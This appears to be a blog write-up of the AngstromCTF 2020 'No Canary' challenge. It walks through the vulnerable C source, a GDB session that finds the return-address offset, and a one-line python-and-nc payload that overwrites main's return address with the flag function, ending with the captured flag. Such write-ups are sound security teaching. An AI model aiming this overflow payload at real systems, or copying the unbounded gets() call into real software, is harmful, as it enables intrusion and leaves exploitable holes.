---
layout: post
title: AngstromCTF 2020 - No Canary
excerpt: "Writeup for basic buffer overflow challenge from AngstromCTF 2020"
categories: [AngstromCTF 2020, pwn]
---

### No Canary

No Canary was the first challenge in the Binary category from AngstromCTF 2020. The challenge provided a 64-bit executable and some source code (below). Viewing the source, it is apparent that a 20 character buffer is initialized, and the vulnerable function `gets` allows us to supply input into that buffer. Since `gets` doesn't limit how many characters we write into the buffer, we can write more than 20, resulting in a [buffer overflow](https://en.wikipedia.org/wiki/Buffer_overflow).

{% highlight c %}

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void flag() {
	system("/bin/cat flag.txt");
}

int main() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	gid_t gid = getegid();
	setresgid(gid, gid, gid);

	puts("Ahhhh, what a beautiful morning on the farm!\n");
	puts("       _.-^-._    .--.");
	puts("    .-'   _   '-. |__|");
	puts("   /     |_|     \\|  |");
	puts("  /               \\  |");
	puts(" /|     _____     |\\ |");
	puts("  |    |==|==|    |  |");
	puts("  |    |--|--|    |  |");
	puts("  |    |==|==|    |  |");
	puts("^^^^^^^^^^^^^^^^^^^^^^^^\n");
	puts("Wait, what? It's already noon!");
	puts("Why didn't my canary wake me up?");
	puts("Well, sorry if I kept you waiting.");
	printf("What's your name? ");

	char name[20];
	gets(name);

	printf("Nice to meet you, %s!\n", name);
}

{% endhighlight %}

Since the source features a "flag" function it's safe to assume that the goal is to overwrite the return pointer of main to point to this function. I started off by running the challenge in my [ctf docker](https://github.com/hoefler02/ctfdoc). As expected, writing more than 20 characters into the buffer resulted in a segmentation fault.

```
root@9dc002f9142e /pwn# chmod +x no_canary
root@9dc002f9142e /pwn# ./no_canary 
Ahhhh, what a beautiful morning on the farm!

       _.-^-._    .--.
    .-'   _   '-. |__|
   /     |_|     \|  |
  /               \  |
 /|     _____     |\ |
  |    |==|==|    |  |
  |    |--|--|    |  |
  |    |==|==|    |  |
^^^^^^^^^^^^^^^^^^^^^^^^

Wait, what? It's already noon!
Why didn't my canary wake me up?
Well, sorry if I kept you waiting.
What's your name? AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB
Nice to meet you, AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB!
fish: './no_canary' terminated by signal SIGSEGV (Address boundary error)
root@9dc002f9142e /pwn# 
```

To figure out how to exploit this, I launched [GDB](https://www.gnu.org/software/gdb/) to find the offset of the buffer and the return pointer which we want to overwrite. 

```
(gdb) disas main
Dump of assembler code for function main:
   0x0000000000401199 <+0>:	push   rbp
   0x000000000040119a <+1>:	mov    rbp,rsp
   0x000000000040119d <+4>:	sub    rsp,0x20
   0x00000000004011a1 <+8>:	mov    rax,QWORD PTR [rip+0x2ec8]        # 0x404070 <stdin@@GLIBC_2.2.5>
   0x00000000004011a8 <+15>:	mov    ecx,0x0
   0x00000000004011ad <+20>:	mov    edx,0x2
   0x00000000004011b2 <+25>:	mov    esi,0x0
   0x00000000004011b7 <+30>:	mov    rdi,rax
   0x00000000004011ba <+33>:	call   0x401090 <setvbuf@plt>
   0x00000000004011bf <+38>:	mov    rax,QWORD PTR [rip+0x2e9a]        # 0x404060 <stdout@@GLIBC_2.2.5>
   0x00000000004011c6 <+45>:	mov    ecx,0x0
   0x00000000004011cb <+50>:	mov    edx,0x2
   0x00000000004011d0 <+55>:	mov    esi,0x0
   0x00000000004011d5 <+60>:	mov    rdi,rax
   0x00000000004011d8 <+63>:	call   0x401090 <setvbuf@plt>
   0x00000000004011dd <+68>:	mov    eax,0x0
   0x00000000004011e2 <+73>:	call   0x401080 <getegid@plt>
   0x00000000004011e7 <+78>:	mov    DWORD PTR [rbp-0x4],eax
   0x00000000004011ea <+81>:	mov    edx,DWORD PTR [rbp-0x4]
   0x00000000004011ed <+84>:	mov    ecx,DWORD PTR [rbp-0x4]
   0x00000000004011f0 <+87>:	mov    eax,DWORD PTR [rbp-0x4]
   0x00000000004011f3 <+90>:	mov    esi,ecx
   0x00000000004011f5 <+92>:	mov    edi,eax
   0x00000000004011f7 <+94>:	mov    eax,0x0
   0x00000000004011fc <+99>:	call   0x401040 <setresgid@plt>
   0x0000000000401201 <+104>:	lea    rdi,[rip+0xe18]        # 0x402020
   0x0000000000401208 <+111>:	call   0x401030 <puts@plt>
   0x000000000040120d <+116>:	lea    rdi,[rip+0xe3a]        # 0x40204e
   0x0000000000401214 <+123>:	call   0x401030 <puts@plt>
   0x0000000000401219 <+128>:	lea    rdi,[rip+0xe45]        # 0x402065
   0x0000000000401220 <+135>:	call   0x401030 <puts@plt>
   0x0000000000401225 <+140>:	lea    rdi,[rip+0xe50]        # 0x40207c
   0x000000000040122c <+147>:	call   0x401030 <puts@plt>
   0x0000000000401231 <+152>:	lea    rdi,[rip+0xe5b]        # 0x402093
   0x0000000000401238 <+159>:	call   0x401030 <puts@plt>
   0x000000000040123d <+164>:	lea    rdi,[rip+0xe66]        # 0x4020aa
   0x0000000000401244 <+171>:	call   0x401030 <puts@plt>
   0x0000000000401249 <+176>:	lea    rdi,[rip+0xe71]        # 0x4020c1
   0x0000000000401250 <+183>:	call   0x401030 <puts@plt>
   0x0000000000401255 <+188>:	lea    rdi,[rip+0xe7c]        # 0x4020d8
   0x000000000040125c <+195>:	call   0x401030 <puts@plt>
   0x0000000000401261 <+200>:	lea    rdi,[rip+0xe59]        # 0x4020c1
   0x0000000000401268 <+207>:	call   0x401030 <puts@plt>
   0x000000000040126d <+212>:	lea    rdi,[rip+0xe7b]        # 0x4020ef
   0x0000000000401274 <+219>:	call   0x401030 <puts@plt>
   0x0000000000401279 <+224>:	lea    rdi,[rip+0xe90]        # 0x402110
   0x0000000000401280 <+231>:	call   0x401030 <puts@plt>
   0x0000000000401285 <+236>:	lea    rdi,[rip+0xea4]        # 0x402130
   0x000000000040128c <+243>:	call   0x401030 <puts@plt>
   0x0000000000401291 <+248>:	lea    rdi,[rip+0xec0]        # 0x402158
   0x0000000000401298 <+255>:	call   0x401030 <puts@plt>
   0x000000000040129d <+260>:	lea    rdi,[rip+0xed7]        # 0x40217b
   0x00000000004012a4 <+267>:	mov    eax,0x0
   0x00000000004012a9 <+272>:	call   0x401060 <printf@plt>
   0x00000000004012ae <+277>:	lea    rax,[rbp-0x20]
   0x00000000004012b2 <+281>:	mov    rdi,rax
   0x00000000004012b5 <+284>:	mov    eax,0x0
   0x00000000004012ba <+289>:	call   0x401070 <gets@plt>
   0x00000000004012bf <+294>:	lea    rax,[rbp-0x20]
   0x00000000004012c3 <+298>:	mov    rsi,rax
   0x00000000004012c6 <+301>:	lea    rdi,[rip+0xec1]        # 0x40218e
   0x00000000004012cd <+308>:	mov    eax,0x0
   0x00000000004012d2 <+313>:	call   0x401060 <printf@plt>
   0x00000000004012d7 <+318>:	mov    eax,0x0
   0x00000000004012dc <+323>:	leave  
   0x00000000004012dd <+324>:	ret    
End of assembler dump.

(gdb) b *0x00000000004012bf
Breakpoint 1 at 0x4012bf
(gdb) b *0x00000000004012dd
Breakpoint 2 at 0x4012dd

(gdb) r
Starting program: /pwn/no_canary 
Ahhhh, what a beautiful morning on the farm!

       _.-^-._    .--.
    .-'   _   '-. |__|
   /     |_|     \|  |
  /               \  |
 /|     _____     |\ |
  |    |==|==|    |  |
  |    |--|--|    |  |
  |    |==|==|    |  |
^^^^^^^^^^^^^^^^^^^^^^^^

Wait, what? It's already noon!
Why didn't my canary wake me up?
Well, sorry if I kept you waiting.
What's your name? AAAABBBB

Breakpoint 1, 0x00000000004012bf in main ()

(gdb) x/4xg $rsp
0x7fffffffe640:	0x4242424241414141	0x0000000000401000
0x7fffffffe650:	0x00007fffffffe740	0x0000000000000000
(gdb) c
Continuing.
Nice to meet you, AAAABBBB!

Breakpoint 2, 0x00000000004012dd in main ()
(gdb) x/4xg $rsp
0x7fffffffe668:	0x00007ffff7a2d830	0x0000000000000001
0x7fffffffe678:	0x00007fffffffe748	0x00000001f7ffcca0
(gdb) x flag
0x401186 <flag>:	0xe5894855
(gdb) q
```

Examining the stack pointer after the gets call showes us that the buffer starts at the address `0x7fffffffe640`. We also find the return pointer at `0x7fffffffe668` and the flag function at `0x401186`. Finally, we can used python to subtract the buffer address from the return pointer address. This will tell us how many characters we need to write to reach the return pointer.

```
Python 2.7.12 (default, Oct  8 2019, 14:14:10) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x7fffffffe668 - 0x7fffffffe640
40
```

Since we know the address of the flag function and the offset we need to write to get to the return pointer (40), we are ready to write an exploit to try on the challenge server (shell.actf.co on port 20700). I used inline python for this, but [pwntools](https://github.com/Gallopsled/pwntools) would have worked just as well. As a side note, make sure to always put your addresses in [little endian](https://en.wikipedia.org/wiki/Endianness) as I did below. 

```
root@9dc002f9142e /pwn# python -c "print 'A' * 40 + '\x86\x11\x40\x00\x00\x00\x00\x00'" | nc shell.actf.co 20700
Ahhhh, what a beautiful morning on the farm!

       _.-^-._    .--.
    .-'   _   '-. |__|
   /     |_|     \|  |
  /               \  |
 /|     _____     |\ |
  |    |==|==|    |  |
  |    |--|--|    |  |
  |    |==|==|    |  |
^^^^^^^^^^^^^^^^^^^^^^^^

Wait, what? It's already noon!
Why didn't my canary wake me up?
Well, sorry if I kept you waiting.
What's your name? Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?@!
actf{that_gosh_darn_canary_got_me_pwned!}
Segmentation fault
```

This gives `actf{that_gosh_darn_canary_got_me_pwned!}`, which is the flag to the challenge!